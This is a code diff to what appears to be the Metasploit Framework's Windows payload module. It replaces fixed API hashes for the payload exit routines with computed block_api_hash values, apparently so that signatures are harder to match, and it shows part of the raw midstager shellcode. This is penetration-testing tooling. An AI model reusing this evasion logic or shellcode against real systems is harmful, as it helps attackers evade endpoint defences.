@@ -21,15 +21,15 @@ module Msf::Payload::Windows
 
   #
   # ROR hash associations for some of the exit technique routines.
-  #
+
   @@exit_types =
     {
       nil       => 0,          # Default to nothing
       ''        => 0,          # Default to nothing
-      'seh'     => 0xEA320EFE, # SetUnhandledExceptionFilter
-      'thread'  => 0x0A2A1DE0, # ExitThread
-      'process' => 0x56A2B5F0, # ExitProcess
-      'none'    => 0x5DE2C5AA  # GetLastError
+      'seh'     => Rex::Text.block_api_hash("kernel32.dll", "SetUnhandledExceptionFilter").to_i(16), # SetUnhandledExceptionFilter
+      'thread'  => Rex::Text.block_api_hash("kernel32.dll", "ExitThread").to_i(16), # ExitThread
+      'process' => Rex::Text.block_api_hash("kernel32.dll", "ExitProcess").to_i(16), # ExitProcess
+      'none'    => Rex::Text.block_api_hash("kernel32.dll", "GetLastError").to_i(16)  # GetLastError
     }
 
   #
@@ -84,7 +84,18 @@ module Msf::Payload::Windows
       method = datastore[name]
       method = 'thread' if (!method or @@exit_types.include?(method) == false)
 
-      raw[offset, 4] = [ @@exit_types[method] ].pack(pack || 'V')
+      if respond_to?(:block_api_hash)
+        exit_hash = block_api_hash('kernel32.dll', {
+          'seh'     => 'SetUnhandledExceptionFilter',
+          'thread'  => 'ExitThread',
+          'process' => 'ExitProcess',
+          'none'    => 'GetLastError'
+        }[method]).to_i(16)
+      else
+        exit_hash = @@exit_types[method]
+      end
+
+      raw[offset, 4] = [ exit_hash ].pack(pack || 'V')
 
       return true
     end
@@ -112,6 +123,7 @@ module Msf::Payload::Windows
     # data into a buffer which is allocated with VirtualAlloc to avoid running
     # out of stack space or NX problems.
     # See the source file: /external/source/shellcode/windows/midstager.asm
+    # TODO: We should update the midstager to use block-api randomization (passing it to metasm, and block api...)
     midstager =
       "\xfc\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x50\x1c\x8b\x12\x8b" +
       "\x72\x20\xad\xad\x4e\x03\x06\x3d\x32\x33\x5f\x32\x0f\x85\xeb\xff" +
